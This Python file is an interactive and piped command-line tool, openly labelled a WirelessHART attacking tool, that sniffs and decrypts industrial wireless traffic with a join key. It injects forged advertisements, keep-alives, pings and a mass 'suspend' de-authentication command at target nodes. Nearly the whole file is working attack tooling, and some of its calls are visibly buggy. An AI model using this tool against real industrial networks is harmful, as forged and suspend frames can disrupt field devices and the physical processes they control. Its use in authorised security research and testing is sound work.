from argparse import ArgumentParser
import json
import os
import sys
import threading
import logging
from time import sleep

from scapy.config import conf
from scapy.all import BrightTheme

from prompt_toolkit import PromptSession, print_formatted_text
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.formatted_text import ANSI

from whad.cli.app import CommandLineDeviceSink, run_app
from whad.wihart.connector.sniffer import Sniffer
from whad.wihart.connector.injector import Injector
from whad.scapy.layers.wirelesshart import WirelessHart_DataLink_Advertisement

conf.color_theme = BrightTheme()
logger = logging.getLogger(__name__)

last_pkt = None

class WiHARTattackApp(CommandLineDeviceSink):
    """Interactive WirelessHART tool.

    Sniffs in the main loop and lets the user inject traffic from an
    interactive prompt. 
    A toolbar shows live status (sync state, ASN, last time offset)"""

    def __init__(self):
        super().__init__(
            description="WirelessHART attacking tool",
            interface=True,
            commands=False,
        )
        

        if self.is_stdin_piped():
            sub = self.add_subparsers(dest='attack', required=True, parser_class=ArgumentParser)

            p_adv = sub.add_parser('adv', description="Inject a fake advertisement")
            p_adv.add_argument('--dst', type= int, required=True, help="Target node address")
            p_adv.add_argument('--wait', type=int, default=1000, help="Wait offset from start of slot in µs (=1000 if not specified)")

            p_ka = sub.add_parser('ka', description="Inject a fake keep alive")
            p_ka.add_argument('--dst', type=int, required=True, help="Target node address")
            p_ka.add_argument('--wait', type=int, default=1000, help="Wait offset from start of slot in µs (=1000 if not specified)")

            p_ping = sub.add_parser('ping', description="Inject a fake ping request")
            p_ping.add_argument('--dst', type=int, required=True, help="Target node address")
            p_ping.add_argument('--graph', type=int, default=1, help="Graph used (= 0x1 if not specified)")

            p_deauth = sub.add_parser('deauth', description="Inject a suspend command")
            p_deauth.add_argument('--dst', type=int, required=True, help="Target node address")
            p_deauth.add_argument('--duration', type=int, default=1000, help="Suspend duration (= 1000 if not specified)")
        else:
            self.add_argument('-c', '--channel', 
                                dest='channel', 
                                type=int, 
                                default=None,
                                help="Channel to synchronize on (required for passive sync)"
                                )
            
            self.add_argument('-j', '--join-key', 
                                dest='join_key', 
                                type=bytes.fromhex,
                                default=None, 
                                help="Join key (hex)"
                                )
    
            self.add_argument('-d', '--decrypt', 
                                dest='decrypt', 
                                action='store_true',
                                default=False, 
                                help="Try to decrypt packets"
                                )
            
            self.add_argument('--load', 
                                dest='load_file', 
                                default=None,
                                help="Load a saved network state (keys + superframes)"
                                )

        self._show = False
        self._switch_lock = threading.Lock()   
        self._running = False

    def _inject(self, fn, *args, **kwargs):
        """Give the device to the injector to send a packet, then hand it back tp sniffer"""
        with self._switch_lock:
            self.dev.set_connector(self.injector)
            try:
                return fn(*args, **kwargs)
            except Exception as e :
                self.error(f"Injection failed : {e}")
            finally:
                self.dev.set_connector(self.sniffer)

    # --- User interaction -----------------------------------

    def _toolbar(self):
        global last_pkt
        sync = "SYNC" if self.sniffer.is_synchronized() else "NO-SYNC"
        asn = self.sniffer.network.asn if self.sniffer.network is not None else "?"
        off = (last_pkt.metadata.timestamp - last_pkt.metadata.start_of_slot_timestamp) if hasattr(last_pkt, "metadata") else "?"
        show = "on" if self._show else "off"
        decrypt = "on" if self.sniffer.decrypt else "off"
        return (f" [{sync}]  ASN={asn} time_offset={off}  show-packets={show} decrypt={decrypt}")


    def _prompt_loop(self):
        print("PROMPT THREAD ALIVE", file=sys.stderr)

        session = PromptSession(
            "whart> ",
            bottom_toolbar=self._toolbar,
            refresh_interval=0.5,
        )

        print("\n[+] Interactive mode ready. Type 'help' for commands.")

        with patch_stdout():
            while self._running:
                try:
                    line = session.prompt().strip()
                except (EOFError, KeyboardInterrupt):
                    break
                if not line:
                    continue
                if line in ("exit", "quit"):
                    break

                name, *args = line.split()
                handler = getattr(self, f"_cmd_{name.replace('-', '_')}", None)
                if handler is None:
                    print(f"[!] Unknown command: {name} (try 'help')")
                    continue
                try:
                    handler(args)
                except ValueError:
                    print("[!] Invalid input.")
                except Exception as e:                   
                    print(f"[!] {e}")

        self._running = False

    # --- commands ----------------------------------------------------------

    def _cmd_help(self, args):
        print("Commands:")
        for attr in sorted(dir(self)):
            if attr.startswith("_cmd_"):
                name = attr[5:].replace('_', '-')
                doc = (getattr(self, attr).__doc__ or "").strip().split("\n")[0]
                print(f"  {name:<14} {doc}")
        print("  exit / quit")

    def _cmd_sync(self, args):
        if self.sniffer.is_synchronized():
            print("[+] Synchronized.")
        else:
            print(f"[-] Not synchronized yet : looking for active channel.")
            self.sniffer.detect_channel(show=False)
            print("[+] Synchronized.")

    def _cmd_join_key(self, args):
        key = input("Join key (hex) > ").strip()
        key = self.sniffer.decryptor.parse_key(key)
        self.sniffer.add_join_key(key)
        print("[+] Key stored !")

    def _cmd_decrypt(self, args):
        if self.sniffer.decrypt :
            print("[-] Already enabled functionnality.")
        else : 
            self.sniffer.decrypt = True
            print("[+] Enabled decryption.")

    def _cmd_network(self, args):
        print(self.sniffer.network)

    def _cmd_keys(self, args):
        print(self.injector.encryptor)

    def _cmd_show_packets(self, args):
        self._show = not self._show
        print(f"show-packets = {self._show}")

    def _cmd_ping(self, args):
        dst = int(input("Target node (ID) > "), 0)
        graph = int(input("Graph ID > "), 0)
        wait = int(input("Wait offset > "), 0)
        print("[*] Injecting ping_request...")
        self._inject(self.injector.ping_request, dst, graph=graph, wait_offset=wait)

    def _cmd_adv(self, args):
        dst = int(input("Target node (ID) > "), 0)
        wait = int(input("Wait offset > "), 0)
        print("[*] Injecting advertisement...")
        self._inject(self.injector.send_fake_advertisement, dst,
                     channel_map=1, superframes=[], wait_offset=wait)

    def _cmd_ka(self, args):
        dst = int(input("Target node (ID) > "), 0)
        print(f"[*] Injecting keep-alive from 0x1 to {dst}...")
        self._inject(self.injector.send_keep_alive, 0x1, dst)

    def _cmd_deauth(self, args):
        dst = int(input("Packet detination (hex) >"))
        duration= int(input("Suspend duration >"))
        print("[*] Injecting suspend command...")
        self._inject(self.injector.mass_de_authetication_packet(dst, duration))

    def _cmd_save(self, args):
        file = input("File name >")
        self.sniffer.save_network_state(file)
        print("[+] Network state saved")


    def _run_shell(self):
        global last_pkt
        if self.args.channel is None:
            self.error("You need to specify a channel with --channel/-c.")
            return

        self.dev = self.interface
        self.sniffer = Sniffer(self.dev)

        self.injector = Injector(self.dev, store=self.sniffer.decryptor.get_store())
        self.injector.network = self.sniffer.network

        self.dev.set_connector(self.sniffer)
        if self.args.join_key:
            self.sniffer.add_join_key(self.args.join_key)


        if self.args.decrypt :
            self.sniffer.decrypt = True
        self.sniffer.start()
        self.sniffer.enable_tsch()

        if self.args.load_file:
            print(f"[*] Loading network state from {self.args.load_file}")
            self.sniffer.load_network_state(self.args.load_file)

        if self.args.channel is None:
            print("[*] Detecting active channel...")
            self.sniffer.detect_channel(show=False)  
            print("[+] Synchronized.")
        else:
            print(f"[*] Listening on channel {self.args.channel}")
            self.sniffer.channel = self.args.channel

        #Start thread
        self._running = True
        prompt_thread = threading.Thread(target=self._prompt_loop, daemon=True)
        prompt_thread.start()

        try:
            while self._running:
                with self._switch_lock:
                    if self.dev.connector is not self.sniffer:
                        continue
                    for pkt in self.sniffer.sniff(timeout=1):
                        if self._show and WirelessHart_DataLink_Advertisement not in pkt:
                            print_formatted_text(ANSI(str(pkt.metadata) + '\n' + repr(pkt)))

                        last_pkt = pkt
                        if not self._running:
                            break
        except KeyboardInterrupt:
            pass
        finally:
            self._running = False
            self.sniffer.stop()

    def _wait_for_state_file(self, path):
        """Wait for a correct json file"""
        if path is None:
            return None
        while True:
            if os.path.exists(path) and os.path.getsize(path) > 0:
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        return json.load(f)
                except (json.JSONDecodeError, OSError):
                    pass  
            sleep(0.2)


    def _build_piped_injector(self, state):
        self.sniffer = Sniffer(self.dev)

        self.sniffer.load_network_state(state)

        self.injector = Injector(self.dev, store=self.sniffer.decryptor.get_store())
        self.injector.network = self.sniffer.network


    def _run_piped(self):
        if self.args.attack is None:
            self.error("You need to specify an attack to run with --attack/-a.")
            return

        # Get the state delivered from whart-sync
        state_path = getattr(self.args, "network_state", None)
        _ = self._wait_for_state_file(state_path)

        
        self.dev = self.input_interface

        self._build_piped_injector(state_path)

        for _ in range(50):                       # ~10 s max
            if self.injector.network.asn != 0:
                break
            sleep(0.2)
        if self.injector.network.asn == 0:
            self.error("ASN never updated — no traffic through the pipe?")
            return

        try:
            match self.args.attack:
                case 'adv':
                    self._inject(self.injector.send_fake_advertisement, self.args.dst, channel_map=1, superframes=[], wait_offset=1000)
                    print("[*] Injecting a fake advertisement at the edge of the Rx window ", file=sys.stderr)
                    
                case 'ka':
                    self._inject(self.injector.send_keep_alive, 0x1, self.args.dst, wait_offset=1000)
                    print("[*] Injecting a fake keep alive at the edge of the Rx window ", file=sys.stderr)
                    
                case 'ping':
                    self._inject(self.injector.ping_request, self.args.dst)
                    print("[*] Injecting a ping request", file=sys.stderr)
                    
                case 'deauth':
                    self._inject(self.injector.mass_de_authetication_packet, self.args.dst, self.args.duration)
                    print("[*] Injecting a suspend command", file=sys.stderr)

                case _ :
                    self.error("You need to specify one of these attacks [adv | ka | ping | deauth].")
                    return
            sleep(15)
        except Exception as e :
            self.error(f"Injection failed : {e}")
        

            
    def run(self):

        self.pre_run()

        if self.is_piped_interface():
            self._run_piped()
        else:
            self._run_shell()
        
        self.post_run()


def whart_attack_main():
    """Interactive WirelessHART tool main routine."""
    app = WiHARTattackApp()
    run_app(app)